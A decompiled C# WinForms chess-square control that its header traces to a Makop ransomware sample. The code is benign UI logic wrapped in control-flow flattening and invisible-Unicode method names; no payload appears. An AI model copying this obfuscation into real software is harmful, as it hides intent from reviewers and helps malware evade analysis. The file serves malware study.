// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: ةE, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B83DFD6-FCF7-4EFA-B68A-746E3BD488E0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-0ae22d4877231b64b2e9e1252bbe8636ea43fe5692ca899733e715ccfc82e224.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = -965862001;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1968037395)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u206D​​⁬‬‭‪‌‬‬⁫⁮‍‫‏‮⁪⁮⁪‫‮​⁯‫⁬‌⁭​‌‭⁯⁮​​‬⁭‍‌⁫‬‮((Delegate) comparand, (Delegate) value), comparand);
              num1 = (int) num2 * 735573998 ^ 680875862;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = eventHandler == comparand ? 1481319072 : (num3 = 2015605583);
              num1 = num3 ^ (int) num2 * -1785662528;
              continue;
            case 4:
              comparand = eventHandler;
              num1 = -1145514004;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 2008774283;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 440803126)) % 5U)
          {
            case 0:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              int num3 = eventHandler1 == comparand ? 2134030873 : (num3 = 1569838859);
              num1 = num3 ^ (int) num2 * 399203880;
              continue;
            case 1:
              comparand = eventHandler1;
              num1 = 1061611078;
              continue;
            case 2:
              goto label_3;
            case 3:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200F‎‫⁮​⁬​⁭⁮⁬‍⁪‎⁯‬⁮‏​⁬⁯‌‎‍‎‌​‌‮⁫‏‮‍‪‌‏‮⁫⁯‫⁬‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * 378589080 ^ -800463930;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = -39136743;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1056352644)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              piece = this.piece;
              num1 = (int) num2 * -1572247904 ^ 628926307;
              continue;
            case 3:
              num1 = (int) num2 * -1780195183 ^ 409885225;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return piece;
      }
      set
      {
        this.piece = value;
label_1:
        int num1 = -1768158335;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1400730629)) % 9U)
          {
            case 0:
              SimpleSquare.\u206C‌‭⁬⁫⁭‬‮⁭⁯‍‍‍‫⁯​⁯‍⁯‍‭‏⁯‪‬‪⁬‫⁫⁮‬‭​‭‪‌⁭⁫‭⁪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = -1696711438;
              continue;
            case 1:
              num1 = (int) num2 * 1982307902 ^ 214479102;
              continue;
            case 2:
              int num3 = this.piece == null ? 597725737 : (num3 = 2023236637);
              num1 = num3 ^ (int) num2 * 2112369745;
              continue;
            case 3:
              num1 = (int) num2 * -1801980837 ^ 1554149028;
              continue;
            case 4:
              this.piece = (ChessPiece) null;
              num1 = (int) num2 * -967941025 ^ -700630966;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            case 7:
              SimpleSquare.\u206C‌‭⁬⁫⁭‬‮⁭⁯‍‍‍‫⁯​⁯‍⁯‍‭‏⁯‪‬‪⁬‫⁫⁮‬‭​‭‪‌⁭⁫‭⁪‮((Control) this, (Image) null);
              num1 = (int) num2 * -2015343413 ^ -2055428801;
              continue;
            case 8:
              num1 = (int) num2 * -1716241709 ^ 77172073;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    public void colorSquare()
    {
      this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
      SimpleSquare.\u200C⁮⁯‪⁪‮‪⁫‍‌‭‬⁫‍⁫‫‪‍⁭‫⁭​⁮‭‍‫‫‭‌⁭‎​‪⁭‎⁫‍‭‭‫‮((Control) this, this.DefaultColor);
label_1:
      int num1 = 808614854;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1715842617)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1160837103 ^ -781952851;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public Pieces Kind
    {
      set
      {
        this.Piece.Kind = value;
label_1:
        int num1 = -2024946175;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1616107299)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Piece = this.Piece;
              num1 = (int) num2 * -584099803 ^ -126140427;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
label_1:
        int num1 = 804224723;
        bool isBlackSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1940699485)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -1708112416 ^ 838225326;
              continue;
            case 2:
              isBlackSquare = this.isBlackSquare;
              num1 = (int) num2 * -386446117 ^ 715205802;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return isBlackSquare;
      }
      set
      {
        this.isBlackSquare = value;
        this.colorSquare();
      }
    }

    public Repository repo => ChessContext.repo;

    public SimpleSquare()
    {
label_1:
      int num1 = -1689573962;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -262479668)) % 5U)
        {
          case 0:
            this.InitializeComponent();
            SimpleSquare.\u202E‏⁫⁫‏‎‮​‫‏⁭⁫‫‎‫⁬⁯⁬‬‍⁫​⁬‭⁫⁫‬‫‬‏‏‪‮‎​‫‎‫​⁪‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -1956154459 ^ -953870575;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1209991295 ^ -1683497123;
            continue;
          case 4:
            num1 = (int) num2 * -157772455 ^ -1630062741;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      SimpleSquare.\u202E‫⁫​‭⁭‫‏⁪⁪‍‬‬⁬‏‌‮⁮‮‭‏⁫‪⁪‍‮‮‪⁪⁪⁫‎‭‬‏⁭‫‏‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
      EventHandler<MouseEventArgs> click = this.Click;
      if (click == null)
        return;
      click((object) this, e);
    }

    public void HighLight() => SimpleSquare.\u200C⁮⁯‪⁪‮‪⁫‍‌‭‬⁫‍⁫‫‪‍⁭‫⁭​⁮‭‍‫‫‭‌⁭‎​‪⁭‎⁫‍‭‭‫‮((Control) this, Color.ForestGreen);

    public void ClearHighLight()
    {
label_1:
      int num1 = -969986310;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -27238453)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u200C⁮⁯‪⁪‮‪⁫‍‌‭‬⁫‍⁫‫‪‍⁭‫⁭​⁮‭‍‫‫‭‌⁭‎​‪⁭‎⁫‍‭‭‫‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -519824596 ^ 718051384;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 1322581586 ^ 19643047;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public bool IsEmpty
    {
      get
      {
        bool isEmpty = this.Piece == null;
label_1:
        int num1 = -877288315;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -871606880)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * -436481082 ^ 1584899336;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = 1155558936;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ 173435249)) % 7U)
        {
          case 0:
            goto label_3;
          case 1:
            if (disposing)
            {
              num1 = (int) num2 * 1907096903 ^ 1602809926;
              continue;
            }
            num3 = 0;
            break;
          case 2:
            SimpleSquare.\u200D⁬⁫‭‍‏⁫‭‭‮‬‪⁪‪​⁪‭‮‎‮‮‪‍⁬⁪‫‮‎‭​‍‫‎‌‬‎⁬​​‍‮((IDisposable) this.components);
            num1 = (int) num2 * 1301914385 ^ -1913795648;
            continue;
          case 3:
            int num4 = !flag ? -260903177 : (num4 = -722008202);
            num1 = num4 ^ (int) num2 * 84464129;
            continue;
          case 4:
            goto label_1;
          case 5:
            base.Dispose(disposing);
            num1 = 1200977317;
            continue;
          case 6:
            num3 = this.components != null ? 1 : 0;
            break;
          default:
            goto label_12;
        }
        flag = num3 != 0;
        num1 = 918376843;
      }
label_3:
      return;
label_12:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = 561349644;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1056982406)) % 24U)
        {
          case 0:
            SimpleSquare.\u202B‎⁯⁮‮⁫‍‏‮⁫‫⁬⁬⁬‫​‍⁭‬⁮‌​⁮​‬‎‍⁭⁮​‫⁯‫⁪​‏‬‪⁯⁮‮((Control) this.panel1, \u003CModule\u003E.\u202B⁬‍​‮‫⁪‪​​⁭‭⁬‎‪‎‪‎‍‌‍⁫⁬⁯‌⁪‍‏‌‭⁯‫⁫‪‍‬⁭⁯‪‍‮<string>(48826116U));
            num1 = (int) num2 * 1631706803 ^ -919128200;
            continue;
          case 1:
            num1 = (int) num2 * -1372200634 ^ -1565914219;
            continue;
          case 2:
            SimpleSquare.\u202B‬⁮‏‫​‌⁬⁬⁮⁬⁭‍⁭⁭‫‬‎‌‪‭‪⁯‬‍‏‍‮‏​⁪⁮⁫‍⁮‭‪‏⁬⁮‮((Control) this, \u003CModule\u003E.\u202B⁬‍​‮‫⁪‪​​⁭‭⁬‎‪‎‪‎‍‌‍⁫⁬⁯‌⁪‍‏‌‭⁯‫⁫‪‍‬⁭⁯‪‍‮<string>(318188068U));
            SimpleSquare.\u202D⁯⁪‪⁭⁫⁫⁭‪‌‮⁪⁮⁭‏‬‌⁯⁪‍‬⁭⁮‭⁪‌⁮⁯‍‬⁫‬⁬‪‎‍⁭‬​‎‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 553203269 ^ -1598130267;
            continue;
          case 3:
            SimpleSquare.\u202B‬‮‮‏​‌‪‌‫⁪‌⁬‎⁪​‮‫​⁪⁮‭⁮⁫⁯‫⁫‌⁮‫⁯⁪‬‌‪‌‏⁮‏⁭‮((Control) this, new Padding(0));
            num1 = (int) num2 * 906947252 ^ 1294621184;
            continue;
          case 4:
            num1 = (int) num2 * 1945063445 ^ -48446731;
            continue;
          case 5:
            num1 = (int) num2 * -1588924325 ^ 40243889;
            continue;
          case 6:
            SimpleSquare.\u200B‍‏‍‏‬‮‪‮‍⁮‮‮⁭‫‮‭⁪‮‫⁫‮⁭‌‬⁯‎⁪​‮‭⁬⁪⁬⁯​‎⁯‪⁫‮((Control) this.panel1, new Size(137, 132));
            num1 = (int) num2 * 118249212 ^ 439015722;
            continue;
          case 7:
            SimpleSquare.\u202B⁮⁬​​‍‭⁮⁭‌‫⁯⁮‬‭‏‫‎‫‫‭‭⁬‬⁪‮‫​‌⁫‏‏⁯‍⁭‪​‫‭‪‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 316968956 ^ -1530004350;
            continue;
          case 8:
            goto label_3;
          case 9:
            SimpleSquare.\u202B⁪‫⁯‬‏‎‎‮​⁪‌‬⁫‪⁫‏‭‭​‎‭‮⁮⁪‏⁮‌‏‮‏‌⁬​⁪⁬‪‭‭⁬‮((Control) this);
            SimpleSquare.\u200C⁮⁯‪⁪‮‪⁫‍‌‭‬⁫‍⁫‫‪‍⁭‫⁭​⁮‭‍‫‫‭‌⁭‎​‪⁭‎⁫‍‭‭‫‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * 2120367842 ^ -1034905960;
            continue;
          case 10:
            this.panel1 = SimpleSquare.\u200B⁫‮‫‎‫‎‎⁯⁪‬⁫‍‫‮⁪‌⁯​‮⁮‏⁬⁮‭‍‫⁫​‮‬‮⁪⁭‬⁬‬‌⁮⁫‮();
            num1 = (int) num2 * 114134923 ^ -1003482735;
            continue;
          case 11:
            SimpleSquare.\u202A⁮‎‬⁬‍‪‮‎‬⁬​‫⁯​⁫​‎⁬⁯‌‫‬‪‎‌‌⁪⁬‭‌‬⁫⁪‌⁯‌‪⁯‍‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -143445100 ^ 1339530882;
            continue;
          case 12:
            SimpleSquare.\u200E‭‌⁯⁮‎​‎‎‬‮​‍⁫‪‏⁯‎‫‪‌​‎⁯⁭‫‪⁭⁪‫⁬‮‪‌‭‮‫‍‮‬‮(SimpleSquare.\u200E‭‫‌⁫​‍‌⁯‬‎⁮‬‌‏⁯‭⁪⁫‌⁪‭‍⁬‭⁪‪⁬⁯⁫‫⁮‏‬‫‏⁯​‭‎‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * 1811669075 ^ 26575296;
            continue;
          case 13:
            SimpleSquare.\u200D‫‬‫‬⁫⁮‬⁭⁬⁬⁯‪‍‫‌‫⁯⁭⁫⁪‮⁫‮‪‮⁬‏⁮‪⁮‪‌‬‫‮​‍​‬‮((Control) this, false);
            num1 = (int) num2 * 1170956800 ^ 1674042387;
            continue;
          case 14:
            num1 = (int) num2 * 1651938652 ^ 687593256;
            continue;
          case 15:
            goto label_1;
          case 16:
            num1 = (int) num2 * -364878857 ^ -491954737;
            continue;
          case 17:
            SimpleSquare.\u206E‌‌​‎​⁬⁮⁯⁫‫‏​‮‫‏⁪⁬⁪​​⁭‏‎‫‌​⁭‌⁫‮‎‎⁮‭‎‫⁫‬‏‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * -1835998448 ^ -538848195;
            continue;
          case 18:
            num1 = (int) num2 * -1500345850 ^ -678201391;
            continue;
          case 19:
            SimpleSquare.\u206C⁮‪‮⁭‌⁮‮‭‏‮⁯‫⁪‏⁪⁬⁮⁬⁮⁯⁮‭‭⁮⁮‭‪⁫‭‎⁯‫⁯⁪⁭⁪‫‍⁮‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 846157282 ^ -1722443426;
            continue;
          case 20:
            SimpleSquare.\u202D‪‍‬⁪‮‬‮‭‫⁫‮⁫‬⁯‫⁮⁬‭‍‭⁯‭⁭‪‌‮‍⁪‏⁫​​‭‭‎⁭⁪‮‏‮((Control) this.panel1, 0);
            num1 = (int) num2 * 1850753214 ^ 1112445977;
            continue;
          case 21:
            SimpleSquare.\u202B⁮⁬​​‍‭⁮⁭‌‫⁯⁮‬‭‏‫‎‫‫‭‭⁬‬⁪‮‫​‌⁫‏‏⁯‍⁭‪​‫‭‪‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * 412738994 ^ -206464256;
            continue;
          case 22:
            SimpleSquare.\u200B‏‭‎‮‮​‌‌‮‭‫‌‮⁪⁭‎⁪‏‪⁭⁯⁮‎​‪‎‫‫‭‪⁮‪‪⁮‌‍‍⁪⁫‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 1632056721 ^ -1704025083;
            continue;
          case 23:
            num1 = (int) num2 * -2116692189 ^ -822829328;
            continue;
          default:
            goto label_26;
        }
      }
label_3:
      return;
label_26:;
    }

    static Delegate \u206D​​⁬‬‭‪‌‬‬⁫⁮‍‫‏‮⁪⁮⁪‫‮​⁯‫⁬‌⁭​‌‭⁯⁮​​‬⁭‍‌⁫‬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u200F‎‫⁮​⁬​⁭⁮⁬‍⁪‎⁯‬⁮‏​⁬⁯‌‎‍‎‌​‌‮⁫‏‮‍‪‌‏‮⁫⁯‫⁬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u206C‌‭⁬⁫⁭‬‮⁭⁯‍‍‍‫⁯​⁯‍⁯‍‭‏⁯‪‬‪⁬‫⁫⁮‬‭​‭‪‌⁭⁫‭⁪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u200C⁮⁯‪⁪‮‪⁫‍‌‭‬⁫‍⁫‫‪‍⁭‫⁭​⁮‭‍‫‫‭‌⁭‎​‪⁭‎⁫‍‭‭‫‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u202E‏⁫⁫‏‎‮​‫‏⁭⁫‫‎‫⁬⁯⁬‬‍⁫​⁬‭⁫⁫‬‫‬‏‏‪‮‎​‫‎‫​⁪‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202E‫⁫​‭⁭‫‏⁪⁪‍‬‬⁬‏‌‮⁮‮‭‏⁫‪⁪‍‮‮‪⁪⁪⁫‎‭‬‏⁭‫‏‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200D⁬⁫‭‍‏⁫‭‭‮‬‪⁪‪​⁪‭‮‎‮‮‪‍⁬⁪‫‮‎‭​‍‫‎‌‬‎⁬​​‍‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u200B⁫‮‫‎‫‎‎⁯⁪‬⁫‍‫‮⁪‌⁯​‮⁮‏⁬⁮‭‍‫⁫​‮‬‮⁪⁭‬⁬‬‌⁮⁫‮() => new Panel();

    static void \u202B⁪‫⁯‬‏‎‎‮​⁪‌‬⁫‪⁫‏‭‭​‎‭‮⁮⁪‏⁮‌‏‮‏‌⁬​⁪⁬‪‭‭⁬‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202B⁮⁬​​‍‭⁮⁭‌‫⁯⁮‬‭‏‫‎‫‫‭‭⁬‬⁪‮‫​‌⁫‏‏⁯‍⁭‪​‫‭‪‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u206E‌‌​‎​⁬⁮⁯⁫‫‏​‮‫‏⁪⁬⁪​​⁭‏‎‫‌​⁭‌⁫‮‎‎⁮‭‎‫⁫‬‏‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u202A⁮‎‬⁬‍‪‮‎‬⁬​‫⁯​⁫​‎⁬⁯‌‫‬‪‎‌‌⁪⁬‭‌‬⁫⁪‌⁯‌‪⁯‍‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u202B‎⁯⁮‮⁫‍‏‮⁫‫⁬⁬⁬‫​‍⁭‬⁮‌​⁮​‬‎‍⁭⁮​‫⁯‫⁪​‏‬‪⁯⁮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u200B‍‏‍‏‬‮‪‮‍⁮‮‮⁭‫‮‭⁪‮‫⁫‮⁭‌‬⁯‎⁪​‮‭⁬⁪⁬⁯​‎⁯‪⁫‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202D‪‍‬⁪‮‬‮‭‫⁫‮⁫‬⁯‫⁮⁬‭‍‭⁯‭⁭‪‌‮‍⁪‏⁫​​‭‭‎⁭⁪‮‏‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206C⁮‪‮⁭‌⁮‮‭‏‮⁯‫⁪‏⁪⁬⁮⁬⁮⁯⁮‭‭⁮⁮‭‪⁫‭‎⁯‫⁯⁪⁭⁪‫‍⁮‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u200B‏‭‎‮‮​‌‌‮‭‫‌‮⁪⁭‎⁪‏‪⁭⁯⁮‎​‪‎‫‫‭‪⁮‪‪⁮‌‍‍⁪⁫‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u200E‭‫‌⁫​‍‌⁯‬‎⁮‬‌‏⁯‭⁪⁫‌⁪‭‍⁬‭⁪‪⁬⁯⁫‫⁮‏‬‫‏⁯​‭‎‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u200E‭‌⁯⁮‎​‎‎‬‮​‍⁫‪‏⁯‎‫‪‌​‎⁯⁭‫‪⁭⁪‫⁬‮‪‌‭‮‫‍‮‬‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u202B‬‮‮‏​‌‪‌‫⁪‌⁬‎⁪​‮‫​⁪⁮‭⁮⁫⁯‫⁫‌⁮‫⁯⁪‬‌‪‌‏⁮‏⁭‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202B‬⁮‏‫​‌⁬⁬⁮⁬⁭‍⁭⁭‫‬‎‌‪‭‪⁯‬‍‏‍‮‏​⁪⁮⁫‍⁮‭‪‏⁬⁮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202D⁯⁪‪⁭⁫⁫⁭‪‌‮⁪⁮⁭‏‬‌⁯⁪‍‬⁭⁮‭⁪‌⁮⁯‍‬⁫‬⁬‪‎‍⁭‬​‎‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200D‫‬‫‬⁫⁮‬⁭⁬⁬⁯‪‍‫‌‫⁯⁭⁫⁪‮⁫‮‪‮⁬‏⁮‪⁮‪‌‬‫‮​‍​‬‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
